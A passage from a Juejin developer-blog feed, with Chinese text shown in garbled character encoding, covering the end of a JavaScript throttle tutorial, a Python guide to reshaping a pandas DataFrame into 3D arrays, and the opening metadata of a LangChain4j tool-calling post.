æ‰€è°“â€œåœæ‰‹åæ‰§è¡Œâ€ï¼Œåªæ˜¯è¿™ç§æ“ä½œçš„è‡ªç„¶ç»“æœã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">äºŒã€èŠ‚æµï¼šæ§åˆ¶æ‰§è¡Œé¢‘ç‡ï¼Œå¿…è¦æ—¶é¢„çº¦è¡¥å‘</h3>
<p>ç°åœ¨éœ€æ±‚å˜äº†ï¼šä¸ç®¡ç”¨æˆ·å¤šå¿«è¾“å…¥ï¼Œæ¯ 1 ç§’æœ€å¤šåªå‘ä¸€æ¬¡è¯·æ±‚ï¼Œä¸”<strong>æœ€åä¸€æ¬¡è¾“å…¥ä¸èƒ½ä¸¢</strong>ã€‚</p>
<h4 data-id="heading-5">ç¬¬ä¸€æ­¥ï¼šæˆ‘èƒ½ç«‹å³æ‰§è¡Œå—ï¼Ÿ</h4>
<p>ç”¨æ—¶é—´æˆ³åˆ¤æ–­æ˜¯å¦å·²è¿‡ <code>delay</code>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">now</span> = Date.now()<span class="hljs-comment">;</span>
if (now - last &gt;= delay) {
    fn()<span class="hljs-comment">; </span>
    <span class="hljs-attr">last</span> = now<span class="hljs-comment">; // è®°å½•æ‰§è¡Œæ—¶é—´</span>
}
</code></pre>
<p>è¿™èƒ½ä¿è¯æœ€å°é—´éš”ï¼Œä½†æœ‰ä¸ªè‡´å‘½ç¼ºé™·ï¼šå¦‚æœç”¨æˆ·å¿«é€Ÿè¾“å…¥åç«‹åˆ»åœæ­¢ï¼Œæœ€åä¸€æ¬¡å¯èƒ½æ°¸è¿œä¸ä¼šæ‰§è¡Œã€‚</p>
<h4 data-id="heading-6">ç¬¬äºŒæ­¥ï¼šå¦‚ä½•ä¸ä¸¢å°¾ï¼Ÿ</h4>
<p>â†’ åœ¨å†·å´æœŸå†…ï¼Œ<strong>é¢„çº¦ä¸€æ¬¡æœªæ¥çš„æ‰§è¡Œ</strong>ã€‚è¿™å°±è¦ç”¨åˆ° <code>setTimeout</code>ã€‚</p>
<p>äºæ˜¯é€»è¾‘åˆ†è£‚ä¸ºä¸¤æ¡è·¯å¾„ï¼š</p>
<ul>
<li><strong>è·¯å¾„ Aï¼ˆå¯ç«‹å³æ‰§è¡Œï¼‰</strong> ï¼šæ—¶é—´åˆ°äº†ï¼Œé©¬ä¸Šæ‰§è¡Œï¼Œæ›´æ–° <code>last</code></li>
<li><strong>è·¯å¾„ Bï¼ˆè¿˜åœ¨å†·å´ï¼‰</strong> ï¼šæ¸…é™¤ä¹‹å‰çš„é¢„çº¦ï¼Œé‡æ–°é¢„çº¦ä¸€æ¬¡æ‰§è¡Œ</li>
</ul>
<h4 data-id="heading-7">ç¬¬ä¸‰æ­¥ï¼šç®¡ç†é¢„çº¦å®šæ—¶å™¨</h4>
<p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå˜é‡ <code>deferTimer</code> æ¥ä¿å­˜é¢„çº¦ä»»åŠ¡çš„ IDï¼š</p>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">last</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
let <span class="hljs-attr">deferTimer</span> = null<span class="hljs-comment">;</span>
</code></pre>
<p>å½“å¤„äºå†·å´æœŸæ—¶ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">clearTimeout</span>(deferTimer); <span class="hljs-comment">// æ¸…é™¤æ—§é¢„çº¦</span>
deferTimer = <span class="hljs-built_in">setTimeout</span>(() =&gt; {
    last = Date<span class="hljs-selector-class">.now</span>(); <span class="hljs-comment">// å…³é”®ï¼šè¿™æ¬¡æ‰§è¡Œä¹Ÿè¦è®°å½•æ—¶é—´ï¼</span>
    fn<span class="hljs-selector-class">.apply</span>(this, args);
}, delay - (now - last)); <span class="hljs-comment">// ç²¾ç¡®è®¡ç®—å‰©ä½™ç­‰å¾…æ—¶é—´</span>
</code></pre>
<h4 data-id="heading-8">ç¬¬å››æ­¥ï¼šæ•´åˆé€»è¾‘</h4>
<pre><code class="hljs language-ini" lang="ini">function throttle(fn, delay) {
    let <span class="hljs-attr">last</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    let <span class="hljs-attr">deferTimer</span> = null<span class="hljs-comment">;</span>

    return function(...args) {
        const <span class="hljs-attr">context</span> = this<span class="hljs-comment">;</span>
        const <span class="hljs-attr">now</span> = Date.now()<span class="hljs-comment">;</span>

        if (now - last &gt;= delay) {
            // è·¯å¾„ Aï¼šç«‹å³æ‰§è¡Œ
           
            <span class="hljs-attr">last</span> = now<span class="hljs-comment">;</span>
            fn.apply(context, args)<span class="hljs-comment">;</span>
        } else {
            // è·¯å¾„ Bï¼šé¢„çº¦æ‰§è¡Œ
            if (deferTimer) clearTimeout(deferTimer)<span class="hljs-comment">;</span>
            <span class="hljs-attr">deferTimer</span> = setTimeout(() =&gt; {
                <span class="hljs-attr">last</span> = Date.now()<span class="hljs-comment">; // å¿…é¡»æ›´æ–°ï¼</span>
               
                fn.apply(context, args)<span class="hljs-comment">;</span>
            }, delay - (now - last))<span class="hljs-comment">;</span>
        }
    }<span class="hljs-comment">;</span>
}
</code></pre>
<blockquote>
<p>èŠ‚æµçš„æ ¸å¿ƒï¼Œæ˜¯<strong>ä¸¤ç§æ‰§è¡Œæ–¹å¼çš„ååŒ</strong>ï¼š</p>
<ul>
<li>ç«‹å³æ‰§è¡Œé æ—¶é—´æˆ³åˆ¤æ–­</li>
<li>è¡¥å‘æ‰§è¡Œé  <code>setTimeout</code> é¢„çº¦<br/>
è€Œä¸¤è€…å…±äº«åŒä¸€ä¸ª <code>last</code> çŠ¶æ€ï¼Œç¡®ä¿æ•´ä½“èŠ‚å¥ä¸ä¹±ã€‚</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-9">ä¸‰ã€å¯¹æ¯”æ€»ç»“ï¼šé˜²æŠ– vs èŠ‚æµçš„æœºåˆ¶å·®å¼‚</h3>






























<table><thead><tr><th>ç»´åº¦</th><th>é˜²æŠ–ï¼ˆDebounceï¼‰</th><th>èŠ‚æµï¼ˆThrottleï¼‰</th></tr></thead><tbody><tr><td>æ ¸å¿ƒæ“ä½œ</td><td>æ¯æ¬¡è§¦å‘éƒ½ <code>clearTimeout + setTimeout</code></td><td>å†·å´æœŸå†… <code>clearTimeout + setTimeout</code>ï¼Œå¦åˆ™ç«‹å³æ‰§è¡Œ</td></tr><tr><td>çŠ¶æ€å˜é‡</td><td>ä»…éœ€ <code>timerId</code></td><td>éœ€ <code>last</code>ï¼ˆæ—¶é—´ï¼‰ + <code>deferTimer</code>ï¼ˆé¢„çº¦IDï¼‰</td></tr><tr><td>æ‰§è¡Œç‰¹ç‚¹</td><td>åªæ‰§è¡Œæœ€åä¸€æ¬¡</td><td>å›ºå®šé—´éš”æ‰§è¡Œï¼Œä¸”ä¸ä¸¢å°¾</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>æœç´¢å»ºè®®ã€è¡¨å•æ ¡éªŒ</td><td>æ»šåŠ¨åŠ è½½ã€æŒ‰é’®é™é¢‘ã€å®æ—¶ä½ç½®ä¸ŠæŠ¥</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[python]dataframeäºŒç»´æ•°æ® -- > ä¸‰ç»´æ•°æ®]]></title>    <link>https://juejin.cn/post/7589940210831458347</link>    <guid>https://juejin.cn/post/7589940210831458347</guid>    <pubDate>2026-01-02T07:29:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940210831458347" data-draft-id="7589940210831441963" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[python]dataframeäºŒç»´æ•°æ® -- &gt; ä¸‰ç»´æ•°æ®"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-02T07:29:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="import_random"/> <meta itemprop="url" content="https://juejin.cn/user/2013961033882312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [python]dataframeäºŒç»´æ•°æ® -- &gt; ä¸‰ç»´æ•°æ®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2013961033882312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    import_random
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:29:43.000Z" title="Fri Jan 02 2026 07:29:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æˆ‘ä»¬å¯ä»¥å°†äºŒç»´DataFrameé‡å¡‘ä¸ºä¸‰ç»´æ•°ç»„ï¼Œä½†éœ€è¦æ³¨æ„DataFrameæ˜¯äºŒç»´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŒ‡å®šå¦‚ä½•å°†å…¶åˆ†æˆå¤šä¸ªäºŒç»´åˆ‡ç‰‡ï¼ˆå³ç¬¬ä¸‰ç»´ï¼‰ã€‚</p>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªäºŒç»´DataFrameï¼Œå½¢çŠ¶ä¸º (n_rows, n_columns)ï¼Œæˆ‘ä»¬æƒ³å°†å…¶é‡å¡‘ä¸º (a, b, c)ï¼Œå…¶ä¸­ a* b * c = n_rows * n_columsn
ä½†æ˜¯ï¼Œç”±äºDataFrameæ˜¯äºŒç»´çš„ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦å…ˆå°†å…¶è½¬æ¢ä¸ºNumPyæ•°ç»„ï¼Œç„¶åè¿›è¡Œé‡å¡‘ã€‚</p>
<p>ç„¶è€Œï¼Œé‡å¡‘ä¸ºä¸‰ç»´é€šå¸¸æ„å‘³ç€æˆ‘ä»¬è¦å¢åŠ ä¸€ä¸ªç»´åº¦ã€‚<code>å¸¸è§çš„æ–¹æ³•æ˜¯å°†è¡Œæˆ–åˆ—åˆ†ç»„ï¼Œå½¢æˆå¤šä¸ªäºŒç»´å¹³é¢</code>ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª12è¡Œ4åˆ—çš„DataFrameï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶é‡å¡‘ä¸ºï¼ˆ3, 4, 4ï¼‰è¡¨ç¤ºæœ‰3ä¸ª4x4çš„çŸ©é˜µï¼Œæˆ–è€…ï¼ˆ4, 3, 4ï¼‰ç­‰ã€‚</p>
<p>ä½†æ˜¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé‡å¡‘åçš„æ€»å…ƒç´ æ•°é‡å¿…é¡»ä¸åŸDataFrameç›¸åŒã€‚</p>
<p>æ­¥éª¤ï¼š</p>
<ol>
<li>å°†DataFrameè½¬æ¢ä¸ºNumPyæ•°ç»„ã€‚</li>
<li>ä½¿ç”¨reshapeå‡½æ•°é‡å¡‘æ•°ç»„ã€‚</li>
</ol>
<p>å¦å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨<code>np.reshape</code>æˆ–è€…DataFrameçš„<code>values.reshape</code>ã€‚</p>
<p>ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦æŒ‰ç…§ç‰¹å®šçš„æ–¹å¼é‡å¡‘ï¼Œæ¯”å¦‚å°†æ¯å‡ è¡Œä½œä¸ºä¸€ä¸ªäºŒç»´åˆ‡ç‰‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å…ˆç¡®å®šç¬¬ä¸‰ç»´çš„å¤§å°ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦å°†æ¯mè¡Œä½œä¸ºä¸€ä¸ªäºŒç»´åˆ‡ç‰‡ï¼Œé‚£ä¹ˆç¬¬ä¸‰ç»´çš„å¤§å°å°±æ˜¯ n_rows / mï¼Œæ¯ä¸ªåˆ‡ç‰‡æ˜¯ m x n_columnsã€‚</p>
<p>å‡è®¾åŸDataFrameæœ‰n_rowsè¡Œï¼Œn_columnsåˆ—ï¼Œæˆ‘ä»¬æƒ³é‡å¡‘ä¸º (k, m, n_columns)ï¼Œå…¶ä¸­ k * m = n_rowsã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š</p>
<p>å°†äºŒç»´DataFrameè½¬æ¢ä¸ºä¸‰ç»´æ•°ç»„ï¼ˆæˆ–å¼ é‡ï¼‰é€šå¸¸éœ€è¦æ ¹æ®æ•°æ®çš„å†…åœ¨ç»“æ„è¿›è¡Œé‡å¡‘ã€‚ä»¥ä¸‹æ˜¯å‡ ç§å¸¸è§çš„æ–¹æ³•ï¼š</p>
<h2 data-id="heading-0">1. <strong>ä½¿ç”¨NumPyçš„reshapeæ–¹æ³•</strong></h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

<span class="hljs-comment"># åˆ›å»ºç¤ºä¾‹DataFrame</span>
df = pd.DataFrame({
    <span class="hljs-string">'A'</span>: <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>),
    <span class="hljs-string">'B'</span>: <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>, <span class="hljs-number">24</span>),
    <span class="hljs-string">'C'</span>: <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>, <span class="hljs-number">36</span>)
})

<span class="hljs-comment"># è½¬æ¢ä¸ºä¸‰ç»´æ•°ç»„ (3, 4, 3) - 3ä¸ªæ—¶é—´æ­¥é•¿ï¼Œ4ä¸ªæ ·æœ¬ï¼Œ3ä¸ªç‰¹å¾</span>
array_3d = df.values.reshape(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>)
<span class="hljs-built_in">print</span>(array_3d.shape)  <span class="hljs-comment"># (3, 4, 3)</span>
</code></pre>
<h2 data-id="heading-1">2. <strong>åŸºäºæ—¶é—´åºåˆ—çš„é‡å¡‘ï¼ˆæ—¶é—´æ­¥é•¿Ã—æ ·æœ¬Ã—ç‰¹å¾ï¼‰</strong></h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å‡è®¾æ¯4è¡Œä»£è¡¨ä¸€ä¸ªæ—¶é—´åºåˆ—æ®µ</span>
n_timesteps = <span class="hljs-number">3</span>
n_samples = <span class="hljs-number">4</span>
n_features = <span class="hljs-number">3</span>

<span class="hljs-comment"># ç¡®ä¿DataFrameè¡Œæ•°åŒ¹é…</span>
<span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(df) == n_timesteps * n_samples

<span class="hljs-comment"># é‡å¡‘ä¸º (æ—¶é—´æ­¥é•¿, æ ·æœ¬æ•°, ç‰¹å¾æ•°)</span>
reshaped = df.values.reshape(n_timesteps, n_samples, n_features)
</code></pre>
<h2 data-id="heading-2">3. <strong>åŸºäºåˆ†ç»„å˜é‡é‡å¡‘</strong></h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åˆ›å»ºåŒ…å«åˆ†ç»„åˆ—çš„DataFrame</span>
df_grouped = pd.DataFrame({
    <span class="hljs-string">'group'</span>: [<span class="hljs-string">'A'</span>, <span class="hljs-string">'A'</span>, <span class="hljs-string">'A'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'C'</span>, <span class="hljs-string">'C'</span>, <span class="hljs-string">'C'</span>],
    <span class="hljs-string">'feature1'</span>: <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>),
    <span class="hljs-string">'feature2'</span>: <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>, <span class="hljs-number">19</span>)
})

<span class="hljs-comment"># æŒ‰ç…§åˆ†ç»„è½¬æ¢ä¸ºä¸‰ç»´</span>
groups = df_grouped[<span class="hljs-string">'group'</span>].unique()
n_groups = <span class="hljs-built_in">len</span>(groups)
n_rows_per_group = <span class="hljs-number">3</span>
n_features = <span class="hljs-number">2</span>

array_3d = np.zeros((n_groups, n_rows_per_group, n_features))

<span class="hljs-keyword">for</span> i, group <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(groups):
    group_data = df_grouped[df_grouped[<span class="hljs-string">'group'</span>] == group][[<span class="hljs-string">'feature1'</span>, <span class="hljs-string">'feature2'</span>]].values
    array_3d[i] = group_data
</code></pre>
<h2 data-id="heading-3">4. <strong>ä½¿ç”¨Pandasçš„MultiIndexåˆ›å»ºä¸‰ç»´ç»“æ„</strong></h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åˆ›å»ºå¤šå±‚ç´¢å¼•DataFrame</span>
index = pd.MultiIndex.from_product([
    [<span class="hljs-string">'Group1'</span>, <span class="hljs-string">'Group2'</span>],  <span class="hljs-comment"># ç¬¬ä¸€å±‚</span>
    [<span class="hljs-string">'Time1'</span>, <span class="hljs-string">'Time2'</span>, <span class="hljs-string">'Time3'</span>],  <span class="hljs-comment"># ç¬¬äºŒå±‚</span>
    [<span class="hljs-string">'Feature1'</span>, <span class="hljs-string">'Feature2'</span>]  <span class="hljs-comment"># ç¬¬ä¸‰å±‚</span>
], names=[<span class="hljs-string">'Group'</span>, <span class="hljs-string">'Time'</span>, <span class="hljs-string">'Feature'</span>])

df_multi = pd.DataFrame({<span class="hljs-string">'Value'</span>: np.random.randn(<span class="hljs-number">12</span>)}, index=index)

<span class="hljs-comment"># è½¬æ¢ä¸ºä¸‰ç»´æ•°ç»„</span>
unstacked = df_multi.unstack(level=[<span class="hljs-string">'Group'</span>, <span class="hljs-string">'Time'</span>])
array_3d = unstacked.values.reshape(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>)
</code></pre>
<h2 data-id="heading-4">5. <strong>æ‰¹é‡å¤„ç†çš„æ—¶é—´åºåˆ—ï¼ˆæ·±åº¦å­¦ä¹ ä¸­å¸¸ç”¨ï¼‰</strong></h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_sequences</span>(<span class="hljs-params">data, seq_length</span>):
    <span class="hljs-string">"""å°†æ—¶é—´åºåˆ—æ•°æ®è½¬æ¢ä¸ºç›‘ç£å­¦ä¹ æ ¼å¼"""</span>
    sequences = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data) - seq_length + <span class="hljs-number">1</span>):
        seq = data.iloc[i:i + seq_length].values
        sequences.append(seq)
    <span class="hljs-keyword">return</span> np.array(sequences)

<span class="hljs-comment"># åˆ›å»ºåºåˆ—æ•°æ®</span>
sequence_length = <span class="hljs-number">3</span>
X_3d = create_sequences(df, sequence_length)
<span class="hljs-built_in">print</span>(X_3d.shape)  <span class="hljs-comment"># (10, 3, 3) - 10ä¸ªåºåˆ—ï¼Œæ¯ä¸ª3ä¸ªæ—¶é—´æ­¥ï¼Œæ¯ä¸ªæ—¶é—´æ­¥3ä¸ªç‰¹å¾</span>
</code></pre>
<h2 data-id="heading-5">6. <strong>ä½¿ç”¨TensorFlow/PyTorchè¿›è¡Œé‡å¡‘</strong></h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># TensorFlow</span>
<span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf
tensor_3d = tf.reshape(tf.constant(df.values), (<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>))

<span class="hljs-comment"># PyTorch</span>
<span class="hljs-keyword">import</span> torch
tensor_3d = torch.tensor(df.values).reshape(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>)
</code></pre>
<h2 data-id="heading-6">é€‰æ‹©é‡å¡‘ç»´åº¦çš„æŒ‡å¯¼åŸåˆ™ï¼š</h2>
<ol>
<li><strong>æ—¶é—´åºåˆ—æ•°æ®</strong>ï¼š<code>(æ—¶é—´æ­¥é•¿, æ ·æœ¬æ•°, ç‰¹å¾æ•°)</code></li>
<li><strong>å›¾åƒæ•°æ®</strong>ï¼š<code>(æ ·æœ¬æ•°, é«˜åº¦, å®½åº¦, é€šé“æ•°)</code></li>
<li><strong>åˆ†ç»„æ•°æ®</strong>ï¼š<code>(ç»„æ•°, ç»„å†…æ ·æœ¬æ•°, ç‰¹å¾æ•°)</code></li>
<li><strong>è‡ªç„¶è¯­è¨€å¤„ç†</strong>ï¼š<code>(æ‰¹å¤§å°, åºåˆ—é•¿åº¦, è¯å‘é‡ç»´åº¦)</code></li>
</ol>
<h2 data-id="heading-7">æ³¨æ„äº‹é¡¹ï¼š</h2>
<ul>
<li>ç¡®ä¿é‡å¡‘åçš„æ€»å…ƒç´ æ•°é‡ä¸åŸå§‹DataFrameä¸€è‡´</li>
<li>è€ƒè™‘æ•°æ®çš„å®é™…å«ä¹‰å’Œåç»­å¤„ç†éœ€æ±‚</li>
<li>å¦‚æœæ˜¯é¢æ¿æ•°æ®ï¼Œè€ƒè™‘ä½¿ç”¨<code>xarray</code>åº“çš„<code>DataArray</code>æ¥æ›¿ä»£</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> xarray <span class="hljs-keyword">as</span> xr
<span class="hljs-comment"># åˆ›å»ºä¸‰ç»´DataArray</span>
da = xr.DataArray(
    df.values.reshape(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>),
    dims=[<span class="hljs-string">'time'</span>, <span class="hljs-string">'sample'</span>, <span class="hljs-string">'feature'</span>],
    coords={
        <span class="hljs-string">'time'</span>: pd.date_range(<span class="hljs-string">'2023-01-01'</span>, periods=<span class="hljs-number">3</span>, freq=<span class="hljs-string">'D'</span>),
        <span class="hljs-string">'sample'</span>: <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>),
        <span class="hljs-string">'feature'</span>: [<span class="hljs-string">'A'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'C'</span>]
    }
)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChain4j å·¥å…·è°ƒç”¨å®æˆ˜]]></title>    <link>https://juejin.cn/post/7589932422654181412</link>    <guid>https://juejin.cn/post/7589932422654181412</guid>    <pubDate>2026-01-02T07:35:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589932422654181412" data-draft-id="7589940210831474731" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChain4j å·¥å…·è°ƒç”¨å®æˆ˜"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-02T07:35:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜NEO"/> <meta itemprop="url" content="https://juejin.cn/user/1990557030679672"/></div> <div itemprop="publisher" itemscope="itemscope" 